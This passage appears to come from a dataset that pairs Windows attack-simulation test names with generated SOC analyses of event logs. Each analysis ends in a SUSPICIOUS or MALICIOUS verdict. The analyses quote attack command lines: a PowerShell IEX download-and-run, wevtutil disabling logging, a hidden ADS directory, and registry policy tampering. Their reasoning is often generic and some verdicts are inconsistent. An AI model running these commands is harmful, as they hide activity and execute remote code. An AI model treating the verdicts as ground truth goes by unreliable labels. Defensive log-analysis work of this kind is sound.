- **Resolution**: **MALICIOUS**
  - The execution of a PowerShell script from an external and unverified source using `IEX (IWR ...)` is a strong indicator of potential malicious intent. This kind of behavior is typical in situations where an attacker is trying to establish persistence or command control over the system.
  
### Recommendations:
1. **Immediate Action**: Isolate the affected system to prevent further possible malicious activity.
2. **Script Analysis**: Download and examine the script from the URL to assess its purpose and potential impacts.
3. **User Attribution**: Confirm whether the administrator user `admin_test` initiated or authorized this command. Investigate further if it was unexpected.
4. **Security Reviews**: Conduct a full security review of `Server002` to identify other possible indicators of compromise or vulnerabilities.
5. **Network Monitoring**: Increase monitoring of outbound connections that may indicate additional unauthorized data exfiltration or malicious activities.
6. **Patch & Update Systems**: Ensure that all systems, especially PowerShell, are up to date and have security patches applied.

Taking these steps will help mitigate the current threat and prevent potential future intrusions or compromises."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"Upon reviewing the provided Windows event logs, a few items stand out that warrant closer examination for potential indicators of compromise:

1. **PowerShell Activity:**
   - Multiple entries related to `powershell.exe` are noted with a certain command `Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe`.
   - The use of PowerShell for executing scripts could be legitimate; however, such specific command patterns often correlate with attempts to download or execute malicious scripts, making this suspicious.
   - The presence of this command across multiple event logs without clear documentation or a user-initiated reason could suggest suspicious behavior, often typical of a fileless malware attack.

2. **Use of `wevtutil.exe` and `conhost.exe`:**
   - Frequent entries for `wevtutil.exe` and `conhost.exe` in close temporal proximity. While both are legitimate Windows binaries, excessive use, especially without clear administrative tasks being logged, can sometimes suggest operational stealth tactics.
   - The `wevtutil.exe` is used to manage event logs, and could be used in attacks to clear logs, covering tracks post-compromise.

3. **High Integrity Level and Use of Administrative Accounts:**
   - Observations show the execution of processes under a high integrity level with the user account `SERVER002\\admin_test`.
   - Such privilege usage could indicate either common administrative actions or efforts by a malicious actor to escalate privileges.

4. **Microsoft Edge Update Activity:**
   - There is ongoing activity related to the Microsoft Edge installer, which might typically be benign if this coincides with a legitimate scheduled update.
   - Given it's run under `NT AUTHORITY\\SYSTEM`, it appears to be scheduled system maintenance.

**Assessment:**
- The use of PowerShell with the specific command pattern and repeated invocation is unusual and suspicious.
- The use of legitimate Windows tools (`wevtutil`, `conhost`) can be standard unless there is an intent to misuse them under cover of legitimate operations.

**Resolution:**
- The overall resolution for these logs is **SUSPICIOUS**. The PowerShell activities, without clear administrative justification, combined with excessive `wevtutil.exe` invocation require further investigation to rule out malicious intents.
- Investigation Steps: 
  - Verify the legitimate use of the PowerShell command; check similar actions, user activity logs, and possible scheduling tasks.
  - Check for any scheduled task or usage pattern with `admin_test` that corresponds with typical administrative duties.
  - Monitor network traffic during these periods for any anomalies suggesting data exfiltration or commands directing remote infrastructure.
  - Implement additional monitoring focused on PowerShell and built-in system utilities to detect further suspicious activities."
Disable Event Logging with wevtutil,"Upon reviewing the provided logs, several patterns and events merit closer scrutiny regarding potential security concerns. Let's break down the logs based on the various categories provided:

### Security Logs:

1. **EventID 4616:** This event logs a time change performed by the process `svchost.exe`, which is typical for time synchronization tasks. While this action might seem suspicious if taken out of context, it matches expected behavior related to time management services on Windows. However, pretexts for hiding malicious timestamps could be further investigated.

2. **EventID 4634 and 4624:** These logs indicate a logoff (`EventID 4634`) and subsequent logon (`EventID 4624`) activity for the user `admin_test` from IP address `fe80::e3b5:5371:12a8:9c77`. The logon type 3 indicates a network logon, which is typical for remote connections or resource access over a network and matches typical use-cases.

3. **EventID 4672:** Indicates that the user `admin_test` was granted special privileges. This could be normal for an admin account, but if these privileges were not expected, they could represent a potential security risk if misused.

### Sysmon Logs:

1. **EventID 1 and 5 (Sysmon):** The user `SERVER002\\admin_test` executes various system administration utilities such as `hostname.exe`, `wevtutil.exe`, `cmd.exe`, and `whoami.exe`, indicating command-line activity by an administrative user. The command executed using `cmd.exe` disables the Microsoft-Windows-IKE/Operational logging (`wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false`). Such actions might be performed by an admin user, but if unauthorized or unexpected, could suggest attempts to avoid detection by disabling specific event logging.

### Indicators of Potential Malice:

- **Privilege Elevation and Log Use:** Special privilege assignments to `admin_test`, combined with command-line actions such as modifying event logging, could potentially indicate attempts to either obfuscate actions or prepare for malicious activities.

- **Time Modification:** Although the time modification by `svchost.exe` may be routine, it can also be used by threat actors to manipulate log entries. This can warrant review when combined with the aforementioned activities.

### Assessment and Guidance:

**Resolution: SUSPICIOUS**

The activities observed, notably privilege assignments, the disabling of specific event logs, and the temporal patterns of actions within a narrow time frame, warrant further investigation:
- **Scope Verification:** Confirm whether the `admin_test` account activities were authorized and expected. Check for any anomalies or unexpected logon sessions.
- **Time Modification Patterns:** Analyze further logs around the time modification events to identify any anomalies such as file access logs or modifications that should not have occurred.
- **Command Execution Context:** Investigate the context and intent behind the execution of commands that may suppress logging activities.
- **Security Hygiene:** Ensure that the use of admin accounts aligns with security policies, and verify that their privileges have not been misused or involved in suspicious activities.

To validate the benignity or hostility of these sessions, it’s crucial to follow through on these investigation steps, cross-referencing additional logs, and network traffic data to corroborate the findings."
System Binary Proxy Execution - Wlrmdr Lolbin,"Based on the analysis of the provided Windows event logs across different channels (Sysmon, System, Application, PowerShell, and Security), I have identified several points worth discussing:

1. **Sysmon Logs Findings**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test`. While `wevtutil.exe` is a legitimate utility for managing event logs, frequent execution in a short time span can indicate log tampering or information gathering.
   - PowerShell was executed with the command line referencing `wlrmdr.exe` and `calc.exe`, which resulted in the launch of `wlrmdr.exe` and `calc.exe`. This could indicate the use of PowerShell for automation or manipulation, possibly leveraging Windows logon reminder (`wlrmdr.exe`). However, executing `calc.exe` is generally benign unless used as part of a sequence of operations in a larger malicious script.

2. **System Logs Findings**:
   - Time was adjusted in multiple events, which involved the Windows Time Service. While time syncing is typical, unauthorized or suspicious time changes can be a concern if part of a strategy to confuse log timelines.

3. **PowerShell Logs Findings**:
   - The execution of PowerShell scripts with references to utilities like `wlrmdr.exe` is not inherently malicious. However, the usage context (script execution via PowerShell) should be scrutinized to ensure it aligns with legitimate administrative activity.

4. **Security Logs Findings**:
   - User `admin_test` possesses a high level of privileges, including `SeDebugPrivilege`, which could be exploited in malicious activity.
   - The logon and privilege escalation appeared consistent with an authorized administrator session.

5. **Potential Indicators of Malicious Activity**:
   - The synchronous occurrence of various system utilities and applications managed by an administrative user (`admin_test`), in particular the execution of utilities related to system maintenance and administration (`wevtutil.exe`, `conhost.exe`, `PowerShell`), might indicate a potentially undesirable behavior, depending particularly on the commands executed.
   - The use of `PowerShell` with specific command-line arguments to invoke `wlrmdr.exe` and `calc.exe` can be indicative of a prepared task or an oversight.

**Assessment and Recommendation:**
Given these points, while there is no definitive evidence of malicious actions considering the log entries in isolation, there are several suspicious indicators, such as:
- Frequent execution of administrative utilities.
- High privilege activities.
- Unusual PowerShell script execution pattern.

Given the suspicious context, it is recommended to further investigate:
- The recent actions of the user `admin_test`, examining any scheduled tasks or scripts.
- Context and source of the `PowerShell` commands, and whether they align with current administrative practices.
- Examine any additional logs that could provide context, especially for the IP and system `DESKTOP-3HL5B2P` seen in the NTLM logon event.

Based on the above findings and understanding of potential risks, the resolution judgment is **SUSPICIOUS**. Further investigation is needed to confirm whether these activities are indeed benign or part of a larger compromise."
Windows - Modify file last modified timestamp with PowerShell,"### Detailed Analysis of the Windows Event Logs

Upon reviewing the provided Windows event logs, I focused on the PowerShell logs and Sysmon logs, as the Application, System, and Security logs were empty.

#### Windows PowerShell Log Analysis
- **EventID 600 (Multiple Entries):** These entries indicate the start of a PowerShell session with an executed script command that modifies the ""LastWriteTime"" of a file to ""01/01/1970 00:00:00"". This technique is known as ""timestomping,"" which is often used by attackers to alter timestamps to hide malicious activities.

#### Sysmon Log Analysis
- **EventID 5 (Multiple Entries):** These entries show the execution of several processes by the user ""SERVER002\\admin_test."" Notable processes include:
  - **PowerShell (ProcessId: 6636):** Consistent with the PowerShell logs, indicating the execution of the same potentially malicious PowerShell script.
  - **Whoami, Hostname, and Conhost Executions:** These are typical Windows utilities and seem to originate from common administrative actions. However, they are executed immediately surrounding the PowerShell script execution, which raises flags.

- **EventID 1:** Process creation events that document the execution of Microsoft Edge update processes by ""NT AUTHORITY\\SYSTEM."" These updates appear to be legitimate.

### Assessment

- **PowerShell Usage:** The explicit usage of `LastWriteTime` adjustment to ""01/01/1970"" is highly indicative of an attempt to obscure file activity timestamps, a behavior consistent with malicious intent.
  
- **Sysmon Correlation:** The Sysmon logs corroborate the suspicious PowerShell activity and show executions of various system utilities around the time of the potentially malicious PowerShell command.

### Conclusion

Based on the analysis of the PowerShell and Sysmon logs, there is evidence of potentially malicious activity, specifically relating to the manipulation of file timestamps using PowerShell. Although tampering with timestamps alone doesn't necessarily confirm malicious activity, this action is a widely recognized technique used to evade detection.

### Final Resolution: SUSPICIOUS

The observed timestamp manipulation activity is suspicious and warrants further investigation to determine the intent and any potential malicious outcomes. I recommend:
- Conducting a deeper forensic analysis of the file and directory specified in the PowerShell command.
- Reviewing user activities and access logs for ""SERVER002\\admin_test"" to identify any unauthorized actions.
- Implementing enhanced monitoring of PowerShell executions and enabling script block logging for better visibility.
"
WMIC bypass using remote XSL file,"### Detailed Analysis of Logs:

1. **Sysmon Log Analysis:**
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** Multiple records show the execution of `wevtutil.exe`, which is typically used for managing event logs on Windows, and `conhost.exe`, a legitimate Windows process linked to command prompt sessions. While frequent execution might be related to legitimate administrative tasks or scripts, it is worth noting if this sudden burst of activity aligns with known maintenance activities. If not, it could indicate log tampering or monitoring evasion attempts.
   - **Execution of `wmic` with Internet Resource:** An entry shows `cmd.exe` executing the `wmic` command with a reference to an external XSL file hosted on GitHub (`wmicscript.xsl`). This is particularly suspicious as it suggests an attempt to execute or download scripts from an untrusted source. Such behavior could indicate an attack intending to leverage the Windows Management Instrumentation (WMI) for malicious purposes.

2. **System Log Analysis:**
   - **Time Manipulation Events:** Two events (`EventID: 1`) indicate that the system clock was altered. This behavior can be suspicious as attackers sometimes manipulate time settings to obscure event log entries or to align attack scripts with certain timed tasks.

3. **Application Log Analysis:**
   - **Normal State of Security Products:** There are entries indicating that Windows Defender is in the ""ON"" state. This suggests that the system's built-in protection was active at the time of these logs.

4. **Security Log Analysis:**
   - **High Privileges for `admin_test`:** The account `admin_test` is granted several high-level privileges as indicated by `EventID: 4672`. While this type of event might occur during normal operations by administrators, it coincides with other suspicious behaviors observed in the logs.
   - **Unusual NTLM Authentication:** Logon events (`EventID: 4624`) show that the `admin_test` user logs in using NTLM authentication from a workstation `DESKTOP-3HL5B2P`. If this is not a known or authorized system, this might signal lateral movement within the network or unauthorized access attempts.

### Assessment:
Based on the analysis, there are clear indications of potentially suspicious activity. The combination of high-frequency process executions, time manipulation, an external network request via `wmic`, and elevated privileges granted to the `admin_test` account merits deeper investigation.

### Recommendation:
- **Resolution: SUSPICIOUS**
  - **Actionable Steps:**
    1. Cross-reference the `admin_test` account's activities with known administrative tasks and verify its logon sessions and origin IP for legitimacy.
    2. Investigate network activity around the time of the `wmic` command execution to identify potential data exfiltration or unauthorized script execution.
    3. Verify if the timing of `wevtutil.exe` and `conhost.exe` execution aligns with scheduled tasks or maintenance activities.
    4. Check for other systems' logs within the network for similar patterns to assess the potential for lateral movement or broader compromise.

Continuously monitoring and tightening security controls around the use of administrative privileges and maintaining an updated threat intelligence database will assist in preventing future incidents."
DisallowRun Execution Of Certain Applications,"### Detailed Analysis:

Upon reviewing the provided event logs, several observations can be made regarding system activities, particularly focusing on any suspicious behaviors or indicators of potential compromise.

1. **Process Execution Patterns**:
   - **wevtutil.exe and conhost.exe**: These processes are Windows utilities related to event log operations and console hosts, appearing frequently in the logs at close intervals. The execution of these processes by a user with administrative privileges (`SERVER002\admin_test`) is not immediately alarming. However, the repeated and rapid firing of these processes can sometimes indicate attempts to interact with or manipulate event logs, potentially to cover tracks of malicious activities.
   
2. **Command Line Execution**:
   - **cmd.exe with Registry Modifications**: There is a `cmd.exe` execution with a complex command line involving multiple registry changes. The command aims to add a policy to disallow certain applications (`regedit.exe` and `cmd.exe`) from running. Manipulation of the registry, especially involving disallowance of critical utility executions, is a red flag and may indicate an attempt to hinder or manipulate the system's operational capabilities.
   
3. **High-Integrity Level Processes**:
   - Several processes, especially those involving `cmd.exe`, `whoami.exe`, and `reg.exe`, are executed at a high integrity level. This means they have greater privileges to alter the system, which in the context of register manipulations, signals potential malicious activities.

4. **Presence of SYSTEM and NETWORK SERVICE Processes**:
   - Processes like `svchost.exe`, `sppsvc.exe`, and `TrustedInstaller.exe` are seen running under SYSTEM or NETWORK SERVICE users. These are typical for background service operations and maintenance tasks on Windows systems, which are generally benign if corroborated by appropriate system maintenance tasks or updates.

### Indicators of Malicious Activity:
- The most notable indicator of potential malicious activity is the execution of command prompts leading to registry changes intended to restrict system tools like `cmd.exe` and `regedit.exe`. This suggests an attempt to limit standard user interactions with the system or cover tracks by restricting critical troubleshooting tools.

### Resolution:
**MALICIOUS** - The logs contain distinct signs of malicious activities, primarily due to the registry modifications through command line execution. These modifications suggest an attempt to manipulate the environment stealthily, possibly preparing the system for further exploitation, hindering detection, or causing operational disturbances.

### Guidance on How to Proceed:
1. **Immediate Review and Quarantine**: Investigate the source of the command prompt execution and review user (`SERVER002\admin_test`) activities. The system may need to be isolated until a thorough investigation is complete.
2. **Log Correlation**: Perform a comprehensive review of other logs (including PowerShell, Security logs) if available, to corroborate actions occurring around this timeframe. Reconstruct potential attack vectors or points of compromise.
3. **Registry Restoration**: Use available backups or policies to restore the Windows registry to a known healthy state.
4. **User Awareness and Credentials Review**: Enhance user privileges and credentials auditing, especially focusing on accounts with administrative rights.
5. **Deploy Monitoring and Deterrents**: Increase monitoring for similar patterns and deploy preventative controls or policies that alert on registry tampering or similar activities.

Ensure these activities are closely monitored by your incident response team to mitigate and address any further security risks or escalations."
Mimic Ransomware - Enable Multiple User Sessions,"Based on the analysis of the provided event logs, the following observations can be made:

### Analysis:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The `wevtutil.exe` process is primarily used for fetching event logs, configuring event settings, and so on. While it can be used legitimately, frequent execution by a non-standard user may indicate someone trying to tamper with or clear logs.
   - The running of `conhost.exe`, which is a Windows Console Host, alongside `wevtutil.exe` might be a standard Windows operation, but given this frequency and timing, it's worth noting for further investigation.

2. **Processes Executed by `admin_test` User:**
   - The user `admin_test` initiated several processes, including `hostname.exe` and `whoami.exe`, which are command-line utilities commonly used to gather information about the system and users. These can be benign, but could also indicate someone is verifying their access or configuration.

3. **Modification in Windows Registry:**
   - There is an event showing a registry modification through the `cmd.exe` process, specifically altering the setting for `AllowMultipleTSSessions` in `Winlogon`. This modification directly changes how Terminal Services sessions are handled. Such changes to the registry can sometimes be part of toolkits used for lateral movement or persistence.

4. **Time Changes:**
   - The system logs show changes in the system time, managed by `svchost.exe`. While time synchronization events are usual for systems, repeated or unexpected changes can potentially be concerning when correlating with other suspicious activities such as attempts to cover operational tracks.

5. **Logged Activities from `SERVER002\admin_test`:**
   - The most concerning action is the execution of `cmd.exe` with a direct registry modification which is aimed at allowing multiple Terminal Service sessions. This could potentially allow multiple remote sessions, which might be indicative of an unauthorized change to facilitate unauthorized access.

### Assessment:
Given these findings, the activity described in these logs, especially the registry modification, presents some risk of malicious intent. The apparent manipulation of Terminal Services settings via registry without any clear operational context raises red flags about potential malicious behavior or, at a minimum, poor security practice.

### Resolution:
- **SUSPICIOUS**: The overall activity recorded in these logs does not provide clear evidence of malware but suggests potentially undesired manipulation of system configurations, especially in relation to Terminal Services, which warrants further investigation.

### Recommendations:
1. **Investigate `admin_test` Activities:** Conduct a deeper review of other actions taken by this user on the system around the timeline of these events.
2. **Validate Modifications:** Check whether the registry change was authorized and ensure it aligns with IT policy.
3. **Monitor Account Usage:** Increase monitoring on the `SERVER002\admin_test` account, initiating alerts for unusual or high-risk operations.
4. **Incident Response Engagement:** Consider engaging an incident response team to ensure there's no active compromise, especially considering potentially unauthorized configuration changes.

Additional analysis with more context or questioning the personnel involved may help reach a more definitive conclusion about these activities."
Rundll32 ieadvpack.dll Execution,"Here's a detailed analysis of the provided Windows event logs with an emphasis on identifying any suspicious or potentially malicious activities:

### Analysis:
1. **Frequent usage of Windows utilities (EventID: 1 and 5)**:
   - **PowerShell (powershell.exe)**: Commonly used for legitimate administrative tasks, but also exploited for malicious activities.
   - **wevtutil.exe and conhost.exe**: Seeing processes like `wevtutil.exe` run repeatedly in conjunction with `conhost.exe` might suggest log manipulation attempts, as `wevtutil.exe` can be used to clear logs.
   - **whoami.exe and cmd.exe**: Frequent invocation of `whoami.exe` and `cmd.exe` by the same user (`SERVER002\\admin_test`) could be indicative of privilege enumeration or command execution by an unauthorized user.
   - Use of `cmd.exe` to execute `rundll32.exe` with suspicious command-line arguments: This shows potential for script or command execution possibly being initiated through DLLs, which can be used for malicious purposes.

2. **Suspicious Command-Line Activity (EventID: 1)**:
   - The `rundll32.exe` process is seen executing with a command referencing an unusual `.inf` file located in the temp directory, which is commonly used by attackers to execute malicious payloads.
   - Command-line arguments with `ieadvpack.dll,LaunchINFSection` can be employed by adversaries to execute potentially harmful installations or configure settings through script execution.

3. **Logon and Privileged Actions (EventID: 4624, 4672)**:
   - Logs show SYSTEM-level logon activities with elevated privileges, including SeDebugPrivilege, which is commonly exploited by attackers once systemic access is achieved. These activities alone aren’t unusual for SYSTEM processes, but correlate with the timing of suspicious process executions.

4. **Microsoft Edge Update Processes**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related processes, including COM Registration Helpers, are seen. While these activities coordinate with legitimate software updates, considering the presence of potentially malicious cmd executions, they can be camouflage or coincidental.

5. **No Critical Application or System Error Logs**:
   - Both Application and System logs do not show significant error events or anomalies corresponding to the scrutinized timeline, indicating no abrupt application failures or error warnings from installed security mechanisms, like Windows Defender.

### Assessment:
In this scenario, there’s a blend of activities that must not be outrightly flagged as malicious but raise suspicions that warrant further investigation. Several utilities that are benign in normal use appear concurrently with potentially malicious activity, notably `rundll32.exe` running from the temp directory with peculiar arguments. Furthermore, the combination of legitimate scheduled software updates like Edge and a user (`SERVER002\\admin_test`) repeatedly executing system utilities might point to either misconfiguration or deliberate misuse.

### Conclusion:
Resolution: **SUSPICIOUS**

- **Threats/Risks Identified**: Potential misuse of system tools for unauthorized access or malicious scripts, and misuse of legitimate processes for escalating privileges or evading detection.
  
- **Guidance**: 
  1. Investigate the command-line arguments and source files used by `rundll32.exe`.
  2. Verify the legitimacy and source of Edge updates and ensure they align with organization policy.
  3. Monitor the user activity of `admin_test` and enforce strict logging to capture future activity for correlation with known Indicators of Compromise (IOCs).
  4. Run a full anti-virus and anti-malware scan to detect any dormant threats.
  5. Review and tighten access control and privilege management around admin accounts on the server.

Continued vigilance and deeper investigation are advised to confirm or rule out potential compromise."
Create Hidden Directory via $index_allocation,"Based on the log entries provided for analysis from the Windows PowerShell, Security, Sysmon, System, and Application event logs, let's investigate each section for any suspicious activity:

**Security Log Analysis:**
- The security log entries show adjustments to the system time (EventID 4616) by the LOCAL SERVICE account. The process responsible for this is `C:\Windows\System32\svchost.exe`. Typically, time changes might suggest attempts to alter time-sensitive operations or logs, but since this is being executed by a system service and such tasks often relate to time synchronization, nothing overtly suspicious stands out here.

**Sysmon Log Analysis:**
- Multiple process creation events, primarily concerning legitimate system processes like `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe`. These processes in isolation do not raise any flags.
- A notable entry is the execution of `cmd.exe` with the command line:
  ```
  ""cmd.exe"" /c md %temp%\...$.......::$index_allocation & echo too many secrets > %temp%\...$.......::$index_allocation\secrets.txt
  ```
  This command creates alternate data streams (ADS), which can be used to hide data within the file system. The creation of ADS with obscure filenames (e.g., `...$.......`) could be a technique to obfuscate storage of information, which is suspicious.

**System Log Analysis:**
- Entries about time synchronization activities related to `svchost.exe`. These appear normal for timekeeping and synchronization.

**Application Log Analysis:**
- An entry related to the Software Protection Platform (SPP) logs without any malicious indicators. This is generally routine housekeeping for Windows licensing and doesn't raise any alarms here.

### Assessment:
The primary concern in this log analysis is the command executed via `cmd.exe` that involves creating hidden or obscure files using alternate data streams. This behavior is suspicious because while ADS is a legitimate feature, it is commonly abused by attackers to store data or executables covertly.

### Resolution:
**SUSPICIOUS** - The logs contain activity, particularly around the use of alternate data streams, which doesn't look typical and warrants further investigation.

### Guidance:
- Investigate the creation and modification of alternate data streams to determine the content and intent.
- Perform a thorough file system analysis, especially on directories where these ADS operations were targeted.
- Review user activity around the time of these events for any unauthorized or unusual access patterns.
- Consider monitoring for any further suspicious process executions or command-line activities by the involved account and processes."
Hide Windows Clock Group Policy Feature,"After conducting a thorough analysis of the provided Windows event logs, here are the findings and assessment:

### Analysis

1. **Sysmon Logs:**
   - The logs show consistent execution of processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` by a user `SERVER002\\admin_test` on `Server002`. This pattern could suggest some manual or automated scripting activity.
   - Noteworthy is the command execution involving `cmd.exe` to change a registry setting (`reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideClock /t REG_DWORD /d 1 /f`). This kind of activity could be part of a legitimate script or a suspicious modification attempt. Registry changes, particularly ones that modify user interface elements, can sometimes be associated with malware that tries to hide its activity or manipulate the user's environment.
   - Several processes related to `Microsoft Edge Update` are executing, which involves various files from Edge's update system. This includes typical update processes and components like `MicrosoftEdgeUpdateComRegisterShell64.exe`.
   - Use of `hostname.exe` and `whoami.exe` indicates attempts to gather information about the system and user identity, which is not unusual but is part of typical reconnaissance activity or operational scripting.

2. **System Logs:**
   - The log entry from the Time Service indicates regular NTP synchronization. There is nothing overtly suspicious in this single entry.

3. **Application Logs:**
   - Logs show `Software Protection Platform Service` activity and Microsoft Edge update service actions like stopping. These can indicate routine application and system maintenance tasks.

### Indicators of Potential Concern

- The execution of `cmd.exe` with registry update commands requires additional context. If not part of a known maintenance or configuration script carried out by `admin_test`, it could be potentially risky.
- There are numerous actions performed by service processes like Microsoft Edge Update, which seem legitimate. It is worth verifying whether these actions correspond with expected update schedules or could be indicative of potentially compromised or misconfigured update processes.

### Assessment

Based on this analysis:
- **SUSPICIOUS**: While much of the activity could be benign, the registry modification through `cmd.exe` warrants further investigation. It is recommended to validate whether these actions were expected and authorized, particularly the script or process responsible for initiating them. If this activity is unauthorized, it could indicate a potential security breach, necessitating further scrutiny and potentially more extensive threat hunting or digital forensics efforts.

### Recommendations

1. **Verify with User/Owner**: Confirm with `admin_test` or relevant personnel if they executed or authorized these changes.
2. **Audit Scripts**: Check if there are any scripts or tasks expected to run similar commands during the timeline of these events.
3. **Incident Response**: If deemed unauthorized, escalate to incident response for a deeper evaluation of related activities and potential impact.
4. **Monitor for Recurrence**: Continue to monitor for similar activities or registry manipulation attempts on this system.
"
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"### Detailed Analysis:

1. **MsiInstaller Logs:**
   - There are multiple events indicating the installation of a product using an MSI package, specifically `data.007_DLL.msi`. This is recorded as a successful installation.
   - The source of the MSI package is from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_DLL.msi`), which is often used for installation but can also be indicative of potentially malicious activity if not verified.

2. **Sysmon Logs:**
   - Windows PowerShell activities are recorded. Notably, a PowerShell command with `Invoke-CimMethod` is executed to install the MSI package.
   - Another PowerShell command is executed with `-nop -Command Write-Host CustomAction export executed me; exit`. The use of `-nop` (no profile) and direct command execution is a tactic that could be used to bypass system defenses.
   - Multiple instances of `wevtutil.exe` and `conhost.exe` processes are logged in close succession, which is often common but should be analyzed considering the context if trying to manipulate logs.

3. **PowerShell Logs:**
   - The logs indicate the execution context of PowerShell scripts aligning with the Sysmon entries. The scripts are related to the installation process using `Invoke-CimMethod`, consistent with the MSI activity. 
   - The PowerShell command executed with `-nop` is not inherently malicious, but it is used in script-based attacks or obfuscation efforts.

4. **Microsoft Edge Update:**
   - There is considerable activity related to Microsoft Edge Update processes. The processes are initiated by the `SYSTEM` user, indicating potentially authorized system-level updates, but should be verified for legitimacy.
   - Update operations seem legitimate pending verification with authorized schedules or security updates.

### Assessment:

- **Suspicious Activity Detected:**
  - The installation of an MSI from a temporary directory using scripted PowerShell commands without detailed user or administrator context stands out. This requires verification whether it aligns with standard operating procedures or known software deployment actions.
  - The usage of PowerShell with `Invoke-CimMethod` and no-profile execution implies a need for further investigation to ensure the legitimacy of the invoked methods and sources.

### Recommendation and Resolution:

- **Conduct a thorough review** of the MSI installer and its source. Verify if it is part of legitimate software deployment or if it reflects unauthorized software installation. Ensure the hash values match known good versions.
- **Review organizational PowerShell scripting policies** to understand if the commands executed fit normal behavior or require mitigation.
- **Cross-reference Microsoft Edge Update activities** to confirm the legitimacy with any scheduled updates beyond the usual browser refresh routine.

The logs contain activities that **do not immediately confirm malicious actions**, but given the nature and methods involved, they warrant further scrutiny and verification with organizational records and policies.

### Resolution: **SUSPICIOUS**  
The activities recorded should be investigated to rule out potential misuse or confirm benign intentions. Additional information, such as direct verification from system administrators or legitimate software agreements, is necessary to finalize the assessment."
Activate Windows NoPropertiesMyDocuments Group Policy Feature,"Upon analyzing the provided Windows event logs, here are the key observations regarding potential indicators of malicious activity:

### System Log:
- **Time Changes:**
  - There are multiple entries related to time changes, where the system time was adjusted by the Windows Time Service. The adjustments are consistent with synchronization with an NTP server: `time.windows.com`. This behavior is typical for maintaining accurate system time and doesn't inherently indicate malicious activity.

### Application Log:
- **Edge Update Service:**
  - Logs indicate the stopping of the Edge Update service twice in a row without any additional context. While repeated service stoppage could potentially be linked to issues or misconfigurations, there is no clear indication of malicious behavior in these entries based solely on service stops.

### Security Log:
- **Security Audit:**
  - The Events 4616 indicate a time change as part of synchronization activity, logged under the LOCAL SERVICE account. This aligns with regular system operations and doesn't suggest compromise.

### Sysmon Log:
- **Process Execution:**
  - **wevtutil.exe** and **conhost.exe** are invoked multiple times with user `SERVER002\admin_test`. While these processes relate to event log manipulation and console operations respectively, there is no evidence in the logs showing these were used for malicious purposes (e.g., tampering with logs to cover tracks).
  - **HOSTNAME.EXE** and **whoami.exe** executions do not exhibit any suspicious behavior. Executions appear related to system inventory/import functions.
  - **cmd.exe** is running a registry command: 
    ```
    reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
    ```
    Modifying registry entries can indicate attempts to alter system behavior, but without additional context or repeated user accounts, it does not definitively indicate malicious intent.
  - **MicrosoftEdgeUpdate.exe** : Numerous executions are tied to this process, all run as part of update checks and installations, primarily executed under the `NT AUTHORITY\SYSTEM` account. This is typical for such system processes and doesn't suggest unauthorized changes.

### Summary and Resolution:
The logs show normal system maintenance activities, such as time synchronization and standard application updates like Microsoft Edge. The execution of common utilities like `wevtutil`, `whoami`, `hostname`, and registry editing via `cmd` could be normal administrative commands or scripts, although they can also be used within attack scenarios. 

Given no evident lateral movement, privilege escalation, or execution of known malicious processes from the logs provided:

Final Assessment: **SUSPICIOUS**

### Guidance:
- **Further Investigation on Cmd.exe:**
  - It is prudent to verify the context of the registry changes made by `cmd.exe` considering it modifies system policies. Ensure this is a known and authorized change.
- **Monitor System Behavior:**
  - Continue monitoring for any anomalous activity related to these processes.
- **User Verification:**
  - Confirm activities under `SERVER002\admin_test` are expected and legitimate, especially given these processes were invoked by an admin-associated user.

Given the logs alone, indicators require further context to determine if indeed there are any underlying risks of compromise."
Msiexec.exe - Execute the DllRegisterServer function of a DLL,"### Analysis of Provided Logs

Upon reviewing the provided Windows event logs, I have identified several patterns and potential indicators of suspicious or malicious activity.

#### Suspicious Activities Noticed:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** 
   - Multiple Sysmon events indicate the frequent and rapid execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. These processes are typically used for managing and viewing event logs. While legitimate, if executed in rapid succession, especially by a user account like `admin_test` (potentially a test or newly created admin account), it might indicate an attempt to conceal tracks or modify log data.

2. **Execution of `cmd.exe` with `msiexec.exe`:**
   - A `cmd.exe` process was spawned with a command line executing `msiexec.exe` to utilize a DLL (`MSIRunner.dll`) located in a temporary folder. This behavior can be indicative of malicious activity, especially the use of DLL files in temporary directories, which is commonly seen in malware execution or exploitation attempts.

3. **Use of `HOSTNAME.EXE` and `WHOAMI.EXE`:**
   - The execution of `HOSTNAME.EXE` and `WHOAMI.EXE` might seem benign in isolation; however, they are often used in scripts to gather information about the system and the current user context. When combined with other suspicious activities, they can be indicative of reconnaissance.

#### Indicators of Potential Malicious Activity:

- **File Path and Execution Context:**
  The execution of system tools like `msiexec.exe` from a temporary directory and involving a specific DLL (`MSIRunner.dll`) suggests an attempt to execute code that isn't part of standard operating procedures.

- **Elevated Privileges:**
  The processes are executed with high integrity levels, and the user involved has administrative privileges, providing the necessary permissions for potential unauthorized actions.

- **Usage of System and Network Service Accounts:**
  Activity from system and network service accounts performing unusual tasks can be indicative of an attempt to exploit system privileges.

### Assessment

Based on the above analysis, the activities described contain multiple indicators of potential compromise:

1. **Use of admin accounts in a potentially automated manner suggests unauthorized use or testing of elevated commands.**

2. **Command line operations involving potentially sensitive DLLs suggest attempts at system manipulation or persistence.**

### Resolution

**SUSPICIOUS**

The logs indicate behavior that doesn't conform to normal user activity patterns, suggesting an ongoing reconnaissance or exploitation attempt. Therefore, it needs further investigation.

### Recommendations

1. **Conduct a full security audit:** Examine the integrity of the system files and look for any unexpected modifications or additions.
   
